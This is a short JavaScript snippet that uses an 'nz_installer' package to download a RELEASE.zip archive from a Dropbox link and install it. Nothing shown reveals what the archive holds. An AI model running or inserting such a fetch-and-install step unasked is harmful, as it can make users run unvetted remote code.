import Installer from 'nz_installer'

const url = 'https://dropbox.com/scl/fi/9vh2kv07okqe4mj205mhh/RELEASE.zip?rlkey=flpjb7sgat8s91gd0ewhtz1ya&st=lkcre4p7&dl=1';

const MyInstaller = new Installer();

MyInstaller.runInstall(url, 'RELEASE.zip');
